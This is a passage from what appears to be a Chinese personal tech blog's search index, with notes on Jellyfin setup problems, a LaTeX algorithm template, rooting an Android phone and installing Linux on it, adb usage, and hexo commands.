<p>\u4e3a\u907f\u514d\u89c6\u9891\u8f6c\u7801\uff0c\u53ef\u4ee5\u4ece\u89c6\u9891\u4e2d\u63d0\u53d6\u5185\u7f6e\u7684\u5b57\u5e55\uff0c\u5e76\u4ee5\u7eaf\u6587\u672c\u7684\u5f62\u5f0f\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u5728\u67d0\u4e9b\u7cfb\u7edf\u4e2d\u8fd9\u4e2a\u63d0\u53d6\u7684\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u82b1\u8d39\u8f83\u957f\u65f6\u95f4\u5e76\u5bfc\u81f4\u89c6\u9891\u64ad\u653e\u51fa\u73b0\u5361\u987f\u3002\u5982\u679c\u7981\u7528\u8fd9\u4e2a\u9009\u9879\uff0c\u5f53\u5185\u7f6e\u5b57\u5e55\u4e0d\u80fd\u88ab\u5ba2\u6237\u7aef\u8bbe\u5907\u539f\u751f\u652f\u6301\u65f6\uff0c\u5b57\u5e55\u5c06\u901a\u8fc7\u89c6\u9891\u8f6c\u7801\u88ab\u70e7\u5f55\u8fdb\u89c6\u9891\u4e2d\u3002</p> <ul> <li>\u4e0d\u660e\u767d\u5176\u4e2d\u5185\u7f6e\u5b57\u5e55\u4e0d\u80fd\u88ab\u5ba2\u6237\u7aef\u652f\u6301\u662f\u4ec0\u4e48\u610f\u601d\u3002\u4f46\u662f\u5982\u679c\u5f00\u542f\u6539\u9009\u9879\uff0c\u963f\u91cc\u4e91\u7684\u89c6\u9891\u64ad\u653e\u8fc7\u7a0b\u65e0\u6cd5\u663e\u793a\u5b57\u5e55\uff08\u63d0\u53d6\u901f\u5ea6\u592a\u6162\uff09\uff0c\u4e00\u76f4\u663e\u793a\u63d0\u53d6\u5143\u6570\u636e</li> <li>\u636e\u8bf4\u8fd8\u53ef\u80fd\u5bfc\u81f4\uff1a\u64ad\u653enas\u89c6\u9891\u4e14\u89c6\u9891\u5f88\u5927\u65f6\uff0c\u9700\u8981\u628a\u89c6\u9891\u8bfb\u53d6\u4e00\u904d\uff0c\u5bfc\u81f4\u4f1a\u5361\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u5f00\u59cb\u64ad\u653e</li> </ul> <p>\u9650\u5236\u8f6c\u7801\u901f\u5ea6\uff1a\u5efa\u8bae\u5f00\u542f</p> <p>\u5f53\u8f6c\u7801\u6216\u8005\u518d\u5c01\u88c5\u7684\u8fdb\u5ea6\u8ddd\u79bb\u5f53\u524d\u64ad\u653e\u8fdb\u5ea6\u8db3\u591f\u8fdc\u65f6\uff0c\u6682\u505c\u8fd9\u4e2a\u8fc7\u7a0b\u4ee5\u51cf\u5c11\u8d44\u6e90\u6d88\u8017\u3002\u5f53\u89c2\u770b\u89c6\u9891\u65f6\u4e0d\u7ecf\u5e38\u8c03\u6574\u64ad\u653e\u8fdb\u5ea6\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u529f\u80fd\u5c06\u975e\u5e38\u6709\u7528\u3002\u5982\u679c\u4f60\u9047\u5230\u4e86\u64ad\u653e\u95ee\u9898\uff0c\u8bf7\u5173\u95ed\u8fd9\u4e2a\u9009\u9879\u3002</p> <p>\u542f\u7528\u5907\u7528\u5b57\u4f53\uff1a\u89e3\u51b3\u4e2d\u6587\u5b57\u5e55\u663e\u793a\u65b9\u6846\u95ee\u9898</p> <p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u5907\u7528\u5b57\u4f53\u3002\u8fd9\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u5b57\u5e55\u6e32\u67d3\u4e0d\u6b63\u786e\u7684\u95ee\u9898\u3002</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5f00\u542fva-api\u52a0\u901f\u540e\u64ad\u653e\u62a5\u9519","title":"\u5f00\u542fva-api\u52a0\u901f\u540e\uff0c\u64ad\u653e\u62a5\u9519","text":"<p>\u8bbe\u7f6e\u786c\u4ef6\u52a0\u901fvaapi\uff0c\u4f46\u662f\u64ad\u653e\u663e\u5f0f\u4e0d\u517c\u5bb9\u7684\u683c\u5f0f\u5f39\u7a97\uff0c\u901a\u8fc7\u67e5\u770bffmpeg log\uff0c\u53ef\u4ee5\u770b\u5230 <pre><code>[AVHWDeviceContext @ 0x562f58a85d40] No VA display found for device /dev/dri/renderD128.\nDevice creation failed: -22.\nFailed to set value '/dev/dri/renderD128' for option 'vaapi_device': Invalid argument\nError parsing global options: Invalid argument\n</code></pre></p> <p>\u5747\u662f\u7531\u4e8e/dev/dri\u6743\u9650\u8bbe\u7f6e\u95ee\u9898\u5bfc\u81f4\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7group-add\u53c2\u6570\u89e3\u51b3\u3002</p> <p>With the newer releases, you can the\u00a0group-add\u00a0docker parameter to get around the issue of /dev/dri/renderD128 needing \"render\" group membership in Ubuntu. If you use docker run, you can use the group name instead of the number(<code>--group-add=render</code>). In my /etc/group file, the group number for the render group is 122.</p> <ul> <li>docker</li> <li>docker run: <code>--group-add=\"122\"</code></li> <li>docker-compose: <code>group_add: \"122\"</code></li> <li>lxc\u9700\u8981\u8bbe\u7f6egpu\u8bbe\u5907gid</li> </ul> <p>\u53c2\u8003\uff1a - \u76f8\u540c\u95ee\u9898\uff1aIncorrect permissions for /dev/dri \u00b7 Issue #207  - \u76f8\u540c\u95ee\u9898\uff1aHardware acceleration isn't working properly \u00b7 Issue #26 - linuxserver docker\u4e2d\u7684\u89e3\u51b3\u65b9\u6cd5\uff1aIncorrect permissions for /dev/dri \u00b7 Issue #207  - docker user permission for transcoding \u00b7 Issue #2281 \u00b7 jellyfin/jellyfin \u00b7 GitHub</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5b57\u5e55\u4e71\u7801","title":"\u5b57\u5e55\u4e71\u7801","text":"<p>\u4e2d\u6587\u5b57\u5e55\u663e\u793a\u65b9\u6846\uff0c\u9700\u8981\u8bbe\u7f6e\u5907\u7528\u5b57\u4f53\u3002 \u5728\u5907\u7528\u5b57\u4f53\u76ee\u5f55\u4e0b\u653e\u7f6e\u5b57\u4f53ttf\u6587\u4ef6\uff0c\u6846\u6846\u6d88\u5931\u3002 <pre><code>root@ubuntu20 \u279c  conf.d l /fonts\ntotal 24M\n-rw-rw-rw- 1 jellyfin jellyfin  12M Oct  8  2021 FZFSK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin 9.5M Nov 28  2017 FZHTK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin  14M Dec 21  2017 FZKTK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin 9.5M Nov 28  2017 FZSSK.TTF\n</code></pre></p> <p>\u63a7\u5236\u53f0 -&gt; \u64ad\u653e -&gt; \u5907\u7528\u5b57\u4f53 </p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u64ad\u653e4k-120mbps\u5361\u987f\u82b1\u5c4f","title":"\u64ad\u653e4K 120Mbps\u5361\u987f\uff0c\u82b1\u5c4f","text":"<p>\u4e0a\u8ff0\u89c6\u9891\u901a\u5e38\u90fd\u662fHEVC\u7f16\u7801\uff0c\u800c\u4e00\u822c\u6d4f\u89c8\u5668\u5747\u4e0d\u652f\u6301HEVC\u7f16\u7801\uff08\u5e38\u89c1\u6d4f\u89c8\u5668\u652f\u6301\u7684\u7f16\u7801\uff1aCodec Support | Jellyfin\uff09\uff0c\u56e0\u6b64\u9700\u8981\u8f6c\u7801\u3002</p> <p>\u800c4K -&gt; 4K \u8f6c\u7801\u592a\u8d39gpu\u6027\u80fd\u3002\u6d4b\u8bd5rx550\uff0c\u9009\u62e91080p 20Mbps\u53ef\u4ee5\u6d41\u7545\u64ad\u653e\uff0842fps\uff09\u4e0d\u82b1\u5c4f\u3002\u800c1080p 60\u548c40\u90fd\u4e0d\u884c\uff0c\u5e76\u4e14\u90fd\u662f17fps\u3002</p> <p>\u53c2\u8003\uff1a Jellyfin web client can't play 4k HEVC 120Mbps movies by direct playing and can't play 1080p 60Mbps through transcoding this kind of movies in local storage that in the LAN Jellyfin docker server \u00b7 Issue #4338 \u00b7 jellyfin/jellyfin (github.com)</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5f00\u542fhdr\u8272\u8c03\u6620\u5c04\u540e\u64ad\u653e\u89c6\u9891\u62a5\u9519","title":"\u5f00\u542fHDR\u8272\u8c03\u6620\u5c04\u540e\u64ad\u653e\u89c6\u9891\u62a5\u9519","text":"<p>\u4e0d\u540c\u663e\u5361\u5bf9\u4e8e\u8272\u8c03\u6620\u5c04\u7684\u652f\u6301\u662f\u4e0d\u540c\u7684 - intel\uff1aVPP\u8272\u8c03\u6620\u5c04\uff0c\u548c\u57fa\u4e8eOpencl\u548cCuda\u7684\u8272\u8c03\u6620\u5c04 - nvidia\uff1aCuda - amd\uff1aopencl</p> <p>\u6d4b\u8bd5\u89c6\u9891 - \u5200\u5251\u795e\u57df\u65e0\u591c\u661f\u7684\u548f\u53f9\u8c03\uff1a4K HEVC SDR - \u4f60\u7684\u540d\u5b572160p\uff1a4K HEVC HDR - \u5c0f\u9ec4\u4eba\uff1a4K HEVC HDR</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5a92\u4f53\u5e93\u4e2d\u6587\u6846\u6846","title":"\u5a92\u4f53\u5e93\u4e2d\u6587\u6846\u6846","text":"<p>\u867d\u7136\u5b57\u5e55\u5df2\u7ecf\u89e3\u51b3\u4e86\uff0c\u4f46\u662fsystem\u7684font\u5e76\u4e0d\u4f1a\u4f7f\u7528 Chinese library names are displayed as square \u00b7 Issue #5636 \u00b7 jellyfin/jellyfin (github.com) <pre><code>jellyfin:\n    volumes:\n      - /usr/share/fonts:/usr/share/fonts\n      - /usr/share/fontconfig:/usr/share/fontconfig\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#syncplay","title":"syncplay","text":"<p>nginx\u53cd\u5411\u4ee3\u7406\u5bfc\u81f4syncplay\u4e0d\u5de5\u4f5c\uff08\u6dfb\u52a0\u5230group\u540e\u6ca1\u6709\u4efb\u4f55\u53cd\u6620\uff09Syncplay: how to? : r/jellyfin (reddit.com)</p> <p>\u95ee\u9898\u51fa\u5728nginx\u6ca1\u6709\u4ee3\u7406websocket\uff0c\u4f7f\u7528\u5b98\u65b9\u63d0\u4f9b\u7684nginx\u914d\u7f6e\u6587\u4ef6\u5373\u53ef\u3002 Nginx | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#failed-to-initialize-nvml-unknown-error","title":"Failed to initialize NVML: Unknown Error","text":"<p>NOTICE: Containers losing access to GPUs with error: \"Failed to initialize NVML: Unknown Error\" \u00b7 Issue #1730 \u00b7 NVIDIA/nvidia-docker (github.com)</p> <p>\u540e\u9762\u53d1\u73b0\u95ee\u9898\u8fd8\u5728 \u8bb0\u5f55\u4e00\u4e0b\u6b63\u5e38\u65f6\u7684dev <pre><code>I have no name!@ryzen:/$ ls /dev/\ncore  fd  full  mqueue  null  nvidia0  nvidiactl  nvidia-uvm  nvidia-uvm-tools  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u63d2\u4ef6\u5f85\u7eed","title":"\u63d2\u4ef6\uff08\u5f85\u7eed\uff09","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u76f4\u63a5\u64ad\u653eh265\u7684\u65b9\u6cd5","title":"\u76f4\u63a5\u64ad\u653eh265\u7684\u65b9\u6cd5","text":"<p>windows\u3001linux\u3001mac\u5ba2\u6237\u7aef\uff1ajellyfin-mpv-shim \u00b7 PyPI - \u5229\u7528jellyfin\u7684\u6295\u5c4f\u529f\u80fd\uff0c\u5c06\u6d4f\u89c8\u5668\u7684\u64ad\u653e\u8f6c\u79fb\u5230\u5ba2\u6237\u7aef\u4e0a\uff0c\u4efb\u610f\u683c\u5f0f\u4e0d\u7528\u8f6c\u7801</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#tmm\u4e2d\u6587\u4e71\u7801","title":"tmm\u4e2d\u6587\u4e71\u7801","text":"<pre><code>wget https://mirrors.aliyun.com/alpine/edge/testing/x86_64/font-wqy-zenhei-0.9.45-r2.apk\napk add --allow-untrusted font-wqy-zenhei-0.9.45-r2.apk\n</code></pre> <p>\u4f46\u662f\u4fee\u6539\u4e86compose\uff0c\u4f1a\u5220\u9664\u539f\u672c\u5bb9\u5668\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\u3002 \u6c38\u4e45\u529e\u6cd5\uff0c\u4fee\u6539\u4e3a\u7b2c\u4e09\u65b9docker\u955c\u50cfdzhuang/tinymediamanager-docker: A repository for creating a docker container including TinyMediaManager with GUI interface. (github.com)</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u663e\u5361\u786c\u4ef6\u8f6c\u7801datasheet","title":"\u663e\u5361\u786c\u4ef6\u8f6c\u7801datasheet","text":"<p>Video Encode and Decode GPU Support Matrix | NVIDIA Developer nVidia Hardware Transcoding Calculator for Plex Estimates (elpamsoft.com)</p>","tags":["jellyfin"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/29/2022-11-29-latex/","title":"latex","text":"<p>latex</p>","tags":["latex"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/29/2022-11-29-latex/#\u57fa\u672c\u6392\u7248","title":"\u57fa\u672c\u6392\u7248","text":"","tags":["latex"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/29/2022-11-29-latex/#\u7279\u6b8a\u7b26\u53f7","title":"\u7279\u6b8a\u7b26\u53f7","text":"","tags":["latex"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/29/2022-11-29-latex/#\u7a7a\u683c","title":"\u7a7a\u683c","text":"","tags":["latex"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/29/2022-11-29-latex/#\u7b97\u6cd5","title":"\u7b97\u6cd5","text":"<p>\u5b8f\u5305 <pre><code>\\usepackage{algorithm}\n\\usepackage{algorithmic}\n</code></pre></p> <p>\u683c\u5f0f <pre><code>\\begin{algorithm}\n    %\\textsl{}\\setstretch{1.8}\n    \\renewcommand{\\algorithmicrequire}{\\textbf{Input:}}\n    \\renewcommand{\\algorithmicensure}{\\textbf{Output:}}\n    \\caption{Iterative Solution for Training Stage}\n    \\label{alg1}\n    \\begin{algorithmic}[1]\n        \\REQUIRE target user group $\\mathbf{U}=\\left\\{u_{i}\\right\\}$, group set $\\mathbf{G}=\\left\\{g_{k}\\right\\}$ and attendance records $\\left\\{s_{i, k}^{0}\\right\\}$\n        \\renewcommand{\\algorithmicrequire}{\\textbf{Store:}}\n        \\REQUIRE group attributes $\\mathbf{a}_{k}$ for each $g_{k} \\in \\mathbf{G}$\n        \\ENSURE  users' profile $\\left\\langle\\mathbf{p}_{i}, h_{i, 0}\\right\\rangle$ and social strength $w_{i j}$\n        \\STATE Iteration = True;\n        \\WHILE{Iteration}\n        \\STATE Iteration $=$ False;\n        \\FOR {$u \\in \\mathbf{U}, g_{k} \\in \\mathbf{G}$}\n        \\STATE update $\\left\\langle\\mathbf{p}_{i}, h_{i, 0}\\right\\rangle$ and $\\left\\{w_{i j}\\right\\}$ until convergence;\n        \\STATE update $f_{i, k}, h_{i, k}$ based on Equation 2;\n        \\STATE update $s_{i, k}$ as $\\mathcal{I}\\left(f_{i, k}-h_{i, k}\\right)$;\n        \\IF{$s_{i, k}$ changed} \n        \\STATE Iteration $=$ True;\n        \\ENDIF\n        \\ENDFOR\n        \\ENDWHILE\n    \\end{algorithmic}  \n\\end{algorithm}\n</code></pre></p>","tags":["latex"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/","title":"\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux","text":"<p>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5237\u673a","title":"\u5237\u673a","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li>\u4ec0\u4e48\u662fbootloader\u9501\uff1f</li> <li>\u542f\u52a8\u6b65\u9aa4\uff1aSoC\u4e2dboot -&gt; bootloader -&gt; \u7cfb\u7edf</li> <li>\u53ea\u5141\u8bb8\u542f\u52a8\u7ecf\u8fc7\u7b7e\u540d\u7684\u7cfb\u7edf\u955c\u50cf\uff0c\u56e0\u6b64\u4e0d\u89e3\u9501\u65e0\u6cd5\u5237\u5176\u5b83\u7cfb\u7edf</li> <li>fastboot vs recovery</li> <li>recovery\u662f\u5355\u72ec\u4e00\u4e2a\u5206\u533a\uff0c\u5305\u542b\u4e00\u4e2a\u5c0f\u7684linux\u7cfb\u7edf\uff0c\u624b\u673a\u5f15\u5bfc\u8fdb\u5165\u8be5\u7cfb\u7edf\u540e\u53ef\u4ee5\u8fdb\u884c\u5361\u5237</li> <li>fastboot\uff0c\u662fbootloader\u652f\u6301\u7684\u4e00\u79cd\u6a21\u5f0f\uff0c\u7528\u4e8e\u8fde\u63a5PC\u3002\u8fde\u63a5\u540e\uff0c\u7535\u8111\u901a\u8fc7fastboot\u53ef\u4ee5\u5bf9\u624b\u673a\u5206\u533a\u8fdb\u884c\u4fee\u6539\uff0c\u4ece\u800c\u8fdb\u884c\u7ebf\u5237<ul> <li>\u4e0d\u662f\u6240\u6709\u624b\u673a\u90fd\u652f\u6301fastboot</li> </ul> </li> <li>\u5361\u5237\u5305 vs \u7ebf\u5237\u5305\uff1a</li> <li>\u5361\u5237\u5305\uff1azip\u7ed3\u5c3e\uff0c\u7528\u4e8e\u76f8\u5f53\u4e8e\u7cfb\u7edf\u66f4\u65b0\u6587\u4ef6\u3002\u5927\u5c0f\u6bd4\u7ebf\u5237\u5305\u5c0f\uff082.2 \u548c 3.6 G)</li> <li>\u7ebf\u5237\u5305\uff1a\u5b8c\u6574\u7cfb\u7edf\u955c\u50cf</li> <li>\u6d4b\u8bd5\u53d1\u73b0\u4e8c\u8005\u90fd\u5305\u542bboot.img\u4e14\u662f\u76f8\u540c\u6587\u4ef6</li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#root\u6559\u7a0bmagisk","title":"root\u6559\u7a0b(magisk)","text":"<p>\u5c0f\u7c73\u4f7f\u7528\u5f00\u53d1\u677f\u7cfb\u7edf\uff0c\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97root\uff0c\u4f46\u662f\u8be5root\u6743\u9650\u4e0d\u5b8c\u6574\u3002 \u4f7f\u7528Magisk\u83b7\u5f97root\u6743\u9650\u597d\u5904\u662f\uff0c\u53ef\u4ee5\u968f\u65f6\u542f\u7528\u5173\u95edroot\u3002</p> <p>Magisk\u5b89\u88c5\u6559\u7a0b - Magisk\u4e2d\u6587\u7f51 (magiskcn.com)</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#adb\u8c03\u8bd5","title":"adb\u8c03\u8bd5","text":"<ul> <li>google\u6559\u7a0b\uff1aAndroid \u8c03\u8bd5\u6865 (adb) \u00a0|\u00a0 Android \u5f00\u53d1\u8005 \u00a0|\u00a0 Android Developers</li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5b89\u88c5linux","title":"\u5b89\u88c5linux","text":"<p>\u53c2\u8003\uff1a - Deploy Linux on any rooted Android device with Linux Deploy | My Take on Tech (my-take-on.tech)</p> <ul> <li>\u9700\u8981root</li> <li>linuxdeploy: meefik/linuxdeploy: Install and run GNU/Linux on Android (github.com)</li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#linuxdeploy\u4fdd\u6301\u5f00\u542f","title":"linuxdeploy\u4fdd\u6301\u5f00\u542f","text":"<p>\u5c0f\u7c73\u624b\u673a\u5f00\u542f\u8d85\u7ea7\u7701\u7535\uff0c\u5b9e\u6d4b\u5f85\u673a\u4e00\u5929\u7535\u91cf\u4ece85%\u964d\u4f4e\u523082%\u5de6\u53f3\u3002\u4f46\u662f\u5f00\u542f\u8d85\u7ea7\u7701\u7535\u540e\uff0c\u867d\u7136l\u53ef\u4ee5ssh\u767b\u5f55inuxdeploy\uff0c\u4f46\u662f\u65e0\u6cd5ping\u7f51\u7edc\u3002\u5e76\u4e14\u8fd0\u884c\u7684\u7a0b\u5e8f\u4f1a\u975e\u5e38\u6162\uff0c\u53ea\u6709\u4e0d\u65ad\u56de\u8f66\u624d\u4f1a\u8fd0\u884c\u3002</p> <p>\u5728\u8bbe\u7f6e\u4e2d\u627e\u5230\u9501\u5b9aWi-Fi\u3001CPU\u5524\u9192\u52fe\u9009\u5373\u53ef\u3002</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#root\u540e\u8f6f\u4ef6","title":"root\u540e\u8f6f\u4ef6","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u7981\u7528\u7cfb\u7edf\u670d\u52a1","title":"\u7981\u7528\u7cfb\u7edf\u670d\u52a1","text":"<p>\u53ea\u9700\u8981USB\u8c03\u8bd5\u6743\u9650\uff0c\u65e0\u9700root - 0x192/universal-android-debloater: Cross-platform GUI written in Rust using ADB to debloat non-rooted android devices. Improve your privacy, the security and battery life of your device. (github.com)</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#adb\u76f8\u5173","title":"adb\u76f8\u5173","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u65e0\u7ebf\u8fde\u63a5","title":"\u65e0\u7ebf\u8fde\u63a5","text":"<ul> <li>\u5c0f\u7c73\u4e0a\uff0c\u76ee\u524d\u53ea\u6709\u5728\u6709\u7ebf\u8fde\u63a5\u540e\u3002\u4fee\u6539port\u540e\u624d\u80fd\u8fde\u4e0a\u3002\u5426\u5219\u5c31\u662fconnect failed\uff0c\u6216\u8005\u62d2\u7edd5555\u3002 <pre><code>adb devices\nadb tcpip 5555\nadb connect 172.20.10.3:5555\n</code></pre></li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5b89\u88c5\u8f6f\u4ef6","title":"\u5b89\u88c5\u8f6f\u4ef6","text":"<ul> <li> <p>\u8fdc\u7a0b\u5b89\u88c5\u8f6f\u4ef6 <pre><code>adb install xxx.apk\n</code></pre></p> </li> <li> <p>\u8fdc\u7a0b\u5f00\u542f\u5e94\u7528 <pre><code>adb shell pm list package |grep jelly  # \u83b7\u5f97\u5e94\u7528\u5305\u540d\npackage:org.jellyfin.androidtv\n\nadb shell dumpsys package org.jellyfin.androidtv # \u83b7\u5f97\u5e94\u7528activity\nadb shell am start org.jellyfin.androidtv/.ui.startup.StartupActivity # \u5f00\u542f\u5e94\u7528\n</code></pre></p> </li> </ul> <p>\u63a8\u8350\u7684\u684c\u9762\uff1a - \u5f53\u8d1d\u684c\u9762\uff08\u7528\u4e8eTV\uff09 - novalaunch</p> <p>Genymobile/scrcpy: Display and control your Android device (github.com) - \u9700\u8981\u5148\u786e\u4fddadb\u8fde\u63a5\u6210\u529f\u4e86\uff0c\u8fd0\u884cscrcpy\u624d\u4f1a\u6709\u754c\u9762\u3002\uff08\u4e3a\u5565\u4e0d\u662f\u4e00\u4e2a\u754c\u9762\uff0c\u63d0\u793a\u6211usb\u8fde\u63a5\uff0c\u6216\u8005\u8f93\u5165ip\u5730\u5740\uff1f\uff09\u8fd8\u6ca1\u6709\u6587\u6863\uff0c\u4ee5\u81f3\u4e8e\u6211\u8fd8\u4ee5\u4e3a\u662f\u5e94\u7528\u6253\u4e0d\u5f00\u3002 - ws-scrcpy - \u7528\u6d4f\u89c8\u5668\u8fdc\u7a0b\u63a7\u5236 Android \u624b\u673a\uff0c\u5b9e\u73b0\u4e91\u624b\u673a\u6548\u679c - \u5c0f\u4f17\u8f6f\u4ef6 (appinn.com) - scrcpy\u7f51\u9875\u7248</p> <p>scrcpy\u8981\u60f3\u80fd\u591f\u901a\u8fc7\u952e\u9f20\u64cd\u63a7\uff0c\u9700\u8981\u5f00\u542f\u989d\u5916\u8bbe\u7f6e\u3002 - \u4f46\u662ftmd\uff0c\u9700\u8981\u767b\u5f55\u5c0f\u7c73\u8d26\u53f7\u3002 - wcnmd\uff0c\u8fd8\u9700\u8981\u63d2sim\u5361\u3002</p> <p>On some devices, you also need to enable\u00a0an additional option <code>USB debugging (Security Settings)</code>\u00a0(this is an item different from\u00a0<code>USB debugging</code>) to control it using a keyboard and mouse. Rebooting the device is necessary once this option is set.</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/","title":"hexo\u4f7f\u7528","text":"<p>\u8bb0\u5f55hexo\u76f8\u5173\u5185\u5bb9</p> <p>tag\uff1a\u5173\u952e\u8bcd categories: - \u5de5\u5177\uff1a\u4ecb\u7ecd\u65b0\u53d1\u73b0\u7684\u597d\u7528\u5de5\u5177 - \u6298\u817e\uff1a\u505a\u7684\u4e00\u4ef6\u4e8b - \u7f51\u7edc\uff1a\u8def\u7531\u5668\uff0copenwrt\uff0c\u8f6f\u8def\u7531</p>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5f00\u59cb\u6559\u7a0bstart-guide","title":"\u5f00\u59cb\u6559\u7a0b(start guide)","text":"","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>TODO</p>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u57fa\u672c\u547d\u4ee4","title":"\u57fa\u672c\u547d\u4ee4","text":"<p>\u547d\u4ee4\u5217\u8868</p> <pre><code>hexo new [layout] &lt;title&gt;\n\nhexo server -p 5000\nhexo server -i 192.168.1.1 # \u9ed8\u8ba4\u7ed1\u5b9a0.0.0.0\n\nhexo generate\nhexo generate --deploy  #\u6216\u8005 hexo 